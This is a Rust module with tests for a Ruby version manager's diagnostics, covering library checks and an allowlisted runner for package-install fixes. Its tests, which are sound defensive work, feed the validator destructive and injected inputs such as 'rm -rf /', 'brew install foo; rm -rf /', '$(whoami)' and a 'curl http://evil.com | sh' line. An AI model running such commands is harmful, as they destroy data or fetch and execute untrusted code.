use crate::types::{DiagnosticResult, DiagnosticStatus};
use std::fs;
use std::path::Path;
use std::process::Command;

pub fn run_doctor() -> Result<Vec<DiagnosticResult>, String> {
    let mut results = Vec::new();
    let rubies_dir = dirs::home_dir()
        .expect("Could not find home directory")
        .join(".rubies");

    // Check 1: Rubies directory exists
    results.push(if rubies_dir.exists() {
        DiagnosticResult {
            name: "Rubies directory".into(),
            status: DiagnosticStatus::Ok,
            message: format!("Found at {}", rubies_dir.display()),
            fix_hint: None,
            fix_command: None,
        }
    } else {
        DiagnosticResult {
            name: "Rubies directory".into(),
            status: DiagnosticStatus::Warning,
            message: "~/.rubies does not exist yet".into(),
            fix_hint: Some("Install a Ruby version to create it automatically".into()),
            fix_command: None,
        }
    });

    // Check 2: Any Ruby installed
    let installed_count = if rubies_dir.exists() {
        fs::read_dir(&rubies_dir)
            .map(|entries| {
                entries
                    .flatten()
                    .filter(|e| {
                        e.file_name()
                            .to_string_lossy()
                            .chars()
                            .next()
                            .map(|c| c.is_ascii_digit())
                            .unwrap_or(false)
                    })
                    .count()
            })
            .unwrap_or(0)
    } else {
        0
    };

    results.push(if installed_count > 0 {
        DiagnosticResult {
            name: "Installed Rubies".into(),
            status: DiagnosticStatus::Ok,
            message: format!("{installed_count} version(s) installed"),
            fix_hint: None,
            fix_command: None,
        }
    } else {
        DiagnosticResult {
            name: "Installed Rubies".into(),
            status: DiagnosticStatus::Warning,
            message: "No Ruby versions installed".into(),
            fix_hint: Some("Go to the Install tab to download a Ruby version".into()),
            fix_command: None,
        }
    });

    // Check 3: Shell hook installed
    let shell = std::env::var("SHELL").unwrap_or_default();
    let rc_file = if shell.contains("zsh") {
        dirs::home_dir().map(|h| h.join(".zshrc"))
    } else if shell.contains("bash") {
        dirs::home_dir().map(|h| h.join(".bashrc"))
    } else if shell.contains("fish") {
        dirs::config_dir().map(|c| c.join("fish/conf.d/rubynaut.fish"))
    } else {
        None
    };

    if let Some(rc) = &rc_file {
        let has_hook = rc
            .exists()
            .then(|| fs::read_to_string(rc).ok())
            .flatten()
            .map(|content| content.contains("rubynaut"))
            .unwrap_or(false);

        results.push(if has_hook {
            DiagnosticResult {
                name: "Shell integration".into(),
                status: DiagnosticStatus::Ok,
                message: format!("Hook found in {}", rc.display()),
                fix_hint: None,
                fix_command: None,
            }
        } else {
            DiagnosticResult {
                name: "Shell integration".into(),
                status: DiagnosticStatus::Error,
                message: format!("No Rubynaut hook in {}", rc.display()),
                fix_hint: Some("Go to Settings to install the shell hook".into()),
                fix_command: None,
            }
        });
    }

    // Check 4: PATH check
    if let Ok(which_ruby) = which::which("ruby") {
        let ruby_path = which_ruby.to_string_lossy().to_string();
        let is_ours = ruby_path.contains(".rubies");
        results.push(if is_ours {
            DiagnosticResult {
                name: "PATH resolution".into(),
                status: DiagnosticStatus::Ok,
                message: format!("ruby resolves to {ruby_path}"),
                fix_hint: None,
                fix_command: None,
            }
        } else {
            DiagnosticResult {
                name: "PATH resolution".into(),
                status: DiagnosticStatus::Warning,
                message: format!("ruby resolves to {ruby_path} (not managed by Rubynaut)"),
                fix_hint: Some("Install the shell hook and restart your terminal".into()),
                fix_command: None,
            }
        });
    } else {
        results.push(DiagnosticResult {
            name: "PATH resolution".into(),
            status: DiagnosticStatus::Warning,
            message: "No ruby found in PATH".into(),
            fix_hint: Some("Install a Ruby version and set it as global default".into()),
            fix_command: None,
        });
    }

    // Check 5: Conflicting managers
    let managers = [
        ("rbenv", "rbenv"),
        ("rvm", "rvm"),
        ("mise", "mise"),
        ("asdf", "asdf"),
        ("chruby-exec", "chruby"),
    ];
    let found: Vec<&str> = managers
        .iter()
        .filter(|(bin, _)| which::which(bin).is_ok())
        .map(|(_, name)| *name)
        .collect();

    results.push(if found.is_empty() {
        DiagnosticResult {
            name: "Conflicting managers".into(),
            status: DiagnosticStatus::Ok,
            message: "No other Ruby version managers detected".into(),
            fix_hint: None,
            fix_command: None,
        }
    } else {
        DiagnosticResult {
            name: "Conflicting managers".into(),
            status: DiagnosticStatus::Warning,
            message: format!("Found: {}", found.join(", ")),
            fix_hint: Some("Other managers may interfere with PATH. Consider removing them or disabling their shell hooks.".into()),
            fix_command: None,
        }
    });

    // Check 6: C compiler
    let has_cc = which::which("cc").is_ok()
        || which::which("gcc").is_ok()
        || which::which("clang").is_ok();

    results.push(if has_cc {
        DiagnosticResult {
            name: "C compiler".into(),
            status: DiagnosticStatus::Ok,
            message: "Available (needed for native gem extensions)".into(),
            fix_hint: None,
            fix_command: None,
        }
    } else {
        DiagnosticResult {
            name: "C compiler".into(),
            status: DiagnosticStatus::Warning,
            message: "Not found — native gem extensions won't compile".into(),
            fix_hint: Some(if cfg!(target_os = "macos") {
                "Run: xcode-select --install".into()
            } else {
                "Install build-essential (Debian/Ubuntu) or gcc (Fedora/RHEL)".into()
            }),
            fix_command: if cfg!(target_os = "macos") {
                Some("xcode-select --install".into())
            } else {
                None
            },
        }
    });

    // Check 7: Shared libraries required by ruby-builder binaries
    check_shared_libraries(&mut results);

    // Check 8: GEM_HOME / GEM_PATH conflicts
    if let Ok(gem_home) = std::env::var("GEM_HOME") {
        if !gem_home.contains(".rubies") && !gem_home.is_empty() {
            results.push(DiagnosticResult {
                name: "GEM_HOME override".into(),
                status: DiagnosticStatus::Warning,
                message: format!("GEM_HOME is set to {gem_home} (not managed by Rubynaut)"),
                fix_hint: Some("Check your shell config for GEM_HOME overrides".into()),
                fix_command: None,
            });
        }
    }

    Ok(results)
}

/// Check for shared libraries that ruby-builder binaries depend on.
fn check_shared_libraries(results: &mut Vec<DiagnosticResult>) {
    let os = std::env::consts::OS;

    // Define required libraries per platform
    let checks: Vec<LibCheck> = match os {
        "macos" => vec![
            LibCheck {
                name: "libyaml",
                display: "libyaml (YAML parsing)",
                paths: vec![
                    "/opt/homebrew/lib/libyaml-0.2.dylib",
                    "/usr/local/lib/libyaml-0.2.dylib",
                    "/opt/homebrew/opt/libyaml/lib/libyaml-0.2.dylib",
                ],
                install_cmd: "brew install libyaml",
                pkg_manager: "Homebrew",
            },
            LibCheck {
                name: "openssl",
                display: "OpenSSL (TLS/SSL)",
                paths: vec![
                    "/opt/homebrew/lib/libssl.3.dylib",
                    "/opt/homebrew/lib/libssl.1.1.dylib",
                    "/usr/local/lib/libssl.3.dylib",
                    "/usr/local/lib/libssl.1.1.dylib",
                    "/opt/homebrew/opt/openssl/lib/libssl.dylib",
                    "/opt/homebrew/opt/openssl@3/lib/libssl.dylib",
                ],
                install_cmd: "brew install openssl",
                pkg_manager: "Homebrew",
            },
            LibCheck {
                name: "libffi",
                display: "libffi (Foreign function interface)",
                paths: vec![
                    "/opt/homebrew/lib/libffi.8.dylib",
                    "/usr/local/lib/libffi.8.dylib",
                    "/opt/homebrew/opt/libffi/lib/libffi.dylib",
                ],
                install_cmd: "brew install libffi",
                pkg_manager: "Homebrew",
            },
            LibCheck {
                name: "gmp",
                display: "GMP (Arbitrary precision arithmetic)",
                paths: vec![
                    "/opt/homebrew/lib/libgmp.10.dylib",
                    "/usr/local/lib/libgmp.10.dylib",
                    "/opt/homebrew/opt/gmp/lib/libgmp.dylib",
                ],
                install_cmd: "brew install gmp",
                pkg_manager: "Homebrew",
            },
        ],
        "linux" => {
            // Detect which package manager is available for the install command
            let (pkg_mgr, yaml_cmd, ssl_cmd, ffi_cmd, gmp_cmd) =
                if which::which("apt-get").is_ok() {
                    ("apt", "sudo apt-get install -y libyaml-dev", "sudo apt-get install -y libssl-dev", "sudo apt-get install -y libffi-dev", "sudo apt-get install -y libgmp-dev")
                } else if which::which("dnf").is_ok() {
                    ("dnf", "sudo dnf install -y libyaml-devel", "sudo dnf install -y openssl-devel", "sudo dnf install -y libffi-devel", "sudo dnf install -y gmp-devel")
                } else if which::which("pacman").is_ok() {
                    ("pacman", "sudo pacman -S --noconfirm libyaml", "sudo pacman -S --noconfirm openssl", "sudo pacman -S --noconfirm libffi", "sudo pacman -S --noconfirm gmp")
                } else if which::which("apk").is_ok() {
                    ("apk", "apk add yaml-dev", "apk add openssl-dev", "apk add libffi-dev", "apk add gmp-dev")
                } else {
                    ("unknown", "install libyaml", "install openssl", "install libffi", "install gmp")
                };

            vec![
                LibCheck {
                    name: "libyaml",
                    display: "libyaml (YAML parsing)",
                    paths: vec![
                        "/usr/lib/x86_64-linux-gnu/libyaml-0.so.2",
                        "/usr/lib/aarch64-linux-gnu/libyaml-0.so.2",
                        "/usr/lib64/libyaml-0.so.2",
                        "/usr/lib/libyaml-0.so.2",
                    ],
                    install_cmd: yaml_cmd,
                    pkg_manager: pkg_mgr,
                },
                LibCheck {
                    name: "openssl",
                    display: "OpenSSL (TLS/SSL)",
                    paths: vec![
                        "/usr/lib/x86_64-linux-gnu/libssl.so.3",
                        "/usr/lib/x86_64-linux-gnu/libssl.so.1.1",
                        "/usr/lib/aarch64-linux-gnu/libssl.so.3",
                        "/usr/lib64/libssl.so.3",
                        "/usr/lib64/libssl.so.1.1",
                        "/usr/lib/libssl.so",
                    ],
                    install_cmd: ssl_cmd,
                    pkg_manager: pkg_mgr,
                },
                LibCheck {
                    name: "libffi",
                    display: "libffi (Foreign function interface)",
                    paths: vec![
                        "/usr/lib/x86_64-linux-gnu/libffi.so.8",
                        "/usr/lib/x86_64-linux-gnu/libffi.so.7",
                        "/usr/lib/aarch64-linux-gnu/libffi.so.8",
                        "/usr/lib64/libffi.so.8",
                        "/usr/lib/libffi.so",
                    ],
                    install_cmd: ffi_cmd,
                    pkg_manager: pkg_mgr,
                },
                LibCheck {
                    name: "gmp",
                    display: "GMP (Arbitrary precision arithmetic)",
                    paths: vec![
                        "/usr/lib/x86_64-linux-gnu/libgmp.so.10",
                        "/usr/lib/aarch64-linux-gnu/libgmp.so.10",
                        "/usr/lib64/libgmp.so.10",
                        "/usr/lib/libgmp.so",
                    ],
                    install_cmd: gmp_cmd,
                    pkg_manager: pkg_mgr,
                },
            ]
        }
        _ => vec![],
    };

    for check in &checks {
        let found = check.paths.iter().any(|p| Path::new(p).exists());
        results.push(if found {
            DiagnosticResult {
                name: check.display.to_string(),
                status: DiagnosticStatus::Ok,
                message: "Found".into(),
                fix_hint: None,
                fix_command: None,
            }
        } else {
            DiagnosticResult {
                name: check.display.to_string(),
                status: DiagnosticStatus::Error,
                message: format!("Not found — required by Ruby's native extensions"),
                fix_hint: Some(format!("Install via {}: {}", check.pkg_manager, check.install_cmd)),
                fix_command: Some(check.install_cmd.to_string()),
            }
        });
    }
}

struct LibCheck<'a> {
    #[allow(dead_code)]
    name: &'a str,
    display: &'a str,
    paths: Vec<&'a str>,
    install_cmd: &'a str,
    pkg_manager: &'a str,
}

/// Allowlisted fix command patterns that can be executed by the Doctor UI.
/// Each entry is a prefix that a command must match to be allowed.
const ALLOWED_FIX_PREFIXES: &[&str] = &[
    "brew install ",
    "sudo apt-get install ",
    "sudo dnf install ",
    "sudo pacman -S ",
    "apk add ",
    "sudo zypper install ",
    "xcode-select --install",
];

/// Check whether a command is in the allowlist of safe fix commands.
pub fn is_allowed_fix_command(command: &str) -> bool {
    let trimmed = command.trim();
    ALLOWED_FIX_PREFIXES
        .iter()
        .any(|prefix| trimmed.starts_with(prefix))
}

/// Run a fix command from the Doctor UI.
/// Only allowlisted commands (package installs, xcode-select) are permitted.
pub async fn run_doctor_fix(command: String) -> Result<String, String> {
    let command = command.trim().to_string();
    if command.is_empty() {
        return Err("Empty command".into());
    }

    if !is_allowed_fix_command(&command) {
        return Err(format!("Command not allowed: {command}. Only known package install commands are permitted."));
    }

    // Reject commands containing shell metacharacters
    if command.chars().any(|c| matches!(c, '|' | '&' | ';' | '$' | '`' | '(' | ')' | '{' | '}' | '<' | '>' | '\n' | '\r')) {
        return Err("Command contains forbidden characters".into());
    }

    // Split command into program and args
    let parts: Vec<&str> = command.split_whitespace().collect();

    let output = Command::new(parts[0])
        .args(&parts[1..])
        .output()
        .map_err(|e| format!("Failed to run command: {e}"))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();

    if output.status.success() {
        Ok(format!("{}\n{}", stdout.trim(), stderr.trim()).trim().to_string())
    } else {
        Err(format!("{}\n{}", stderr.trim(), stdout.trim()).trim().to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_run_doctor_returns_results() {
        let results = run_doctor().unwrap();
        assert!(!results.is_empty());
        // Should always have at least: rubies dir, installed rubies, conflicting managers, C compiler
        assert!(results.len() >= 4);
    }

    #[test]
    fn test_doctor_result_serialization() {
        let result = DiagnosticResult {
            name: "Test".into(),
            status: DiagnosticStatus::Ok,
            message: "All good".into(),
            fix_hint: None,
            fix_command: None,
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("\"status\":\"ok\""));
        assert!(json.contains("\"fix_command\":null"));
    }

    #[test]
    fn test_doctor_result_with_fix() {
        let result = DiagnosticResult {
            name: "libyaml".into(),
            status: DiagnosticStatus::Error,
            message: "Not found".into(),
            fix_hint: Some("Install via brew".into()),
            fix_command: Some("brew install libyaml".into()),
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("\"status\":\"error\""));
        assert!(json.contains("brew install libyaml"));
    }

    #[test]
    fn test_diagnostic_status_variants() {
        let ok = serde_json::to_string(&DiagnosticStatus::Ok).unwrap();
        let warning = serde_json::to_string(&DiagnosticStatus::Warning).unwrap();
        let error = serde_json::to_string(&DiagnosticStatus::Error).unwrap();
        assert_eq!(ok, "\"ok\"");
        assert_eq!(warning, "\"warning\"");
        assert_eq!(error, "\"error\"");
    }

    #[test]
    fn test_check_shared_libraries_produces_results() {
        let mut results = Vec::new();
        check_shared_libraries(&mut results);
        // On macOS and Linux, should check at least 4 libraries
        if cfg!(target_os = "macos") || cfg!(target_os = "linux") {
            assert!(results.len() >= 4);
        }
    }

    #[test]
    fn test_doctor_checks_rubies_directory() {
        let results = run_doctor().unwrap();
        let rubies_check = results.iter().find(|r| r.name == "Rubies directory");
        assert!(rubies_check.is_some());
    }

    #[test]
    fn test_doctor_checks_c_compiler() {
        let results = run_doctor().unwrap();
        let cc_check = results.iter().find(|r| r.name == "C compiler");
        assert!(cc_check.is_some());
    }

    #[tokio::test]
    async fn test_run_doctor_fix_allowed_brew_command() {
        // brew install is allowlisted — should pass allowlist validation
        let result = run_doctor_fix("brew install libyaml".to_string()).await;
        // Either succeeds or fails to run (if brew not installed) — but should NOT be rejected by allowlist
        match &result {
            Ok(_) => {} // brew exists and succeeded
            Err(e) => assert!(!e.contains("not allowed"), "Command should pass allowlist: {e}"),
        }
    }

    #[tokio::test]
    async fn test_run_doctor_fix_empty_command() {
        let result = run_doctor_fix("".to_string()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Empty command"));
    }

    #[tokio::test]
    async fn test_run_doctor_fix_rejects_arbitrary_commands() {
        let result = run_doctor_fix("echo hello".to_string()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not allowed"));
    }

    #[tokio::test]
    async fn test_run_doctor_fix_rejects_dangerous_commands() {
        let result = run_doctor_fix("rm -rf /".to_string()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not allowed"));
    }

    #[tokio::test]
    async fn test_run_doctor_fix_rejects_shell_metacharacters() {
        let result = run_doctor_fix("brew install foo; rm -rf /".to_string()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("forbidden characters"));
    }

    #[tokio::test]
    async fn test_run_doctor_fix_rejects_pipe() {
        let result = run_doctor_fix("brew install foo | cat".to_string()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("forbidden characters"));
    }

    #[tokio::test]
    async fn test_run_doctor_fix_rejects_subshell() {
        let result = run_doctor_fix("brew install $(whoami)".to_string()).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("forbidden characters"));
    }

    #[test]
    fn test_is_allowed_fix_command_brew() {
        assert!(is_allowed_fix_command("brew install libyaml"));
        assert!(is_allowed_fix_command("brew install openssl"));
        assert!(is_allowed_fix_command("brew install libffi"));
        assert!(is_allowed_fix_command("brew install gmp"));
    }

    #[test]
    fn test_is_allowed_fix_command_apt() {
        assert!(is_allowed_fix_command("sudo apt-get install -y libyaml-dev"));
        assert!(is_allowed_fix_command("sudo apt-get install -y libssl-dev"));
    }

    #[test]
    fn test_is_allowed_fix_command_dnf() {
        assert!(is_allowed_fix_command("sudo dnf install -y libyaml-devel"));
    }

    #[test]
    fn test_is_allowed_fix_command_pacman() {
        assert!(is_allowed_fix_command("sudo pacman -S --noconfirm libyaml"));
    }

    #[test]
    fn test_is_allowed_fix_command_apk() {
        assert!(is_allowed_fix_command("apk add yaml-dev"));
    }

    #[test]
    fn test_is_allowed_fix_command_xcode() {
        assert!(is_allowed_fix_command("xcode-select --install"));
    }

    #[test]
    fn test_is_allowed_fix_command_rejects_arbitrary() {
        assert!(!is_allowed_fix_command("echo hello"));
        assert!(!is_allowed_fix_command("rm -rf /"));
        assert!(!is_allowed_fix_command("curl http://evil.com | sh"));
        assert!(!is_allowed_fix_command("python -c 'import os'"));
    }

    #[test]
    fn test_is_allowed_fix_command_rejects_empty() {
        assert!(!is_allowed_fix_command(""));
        assert!(!is_allowed_fix_command("   "));
    }
}
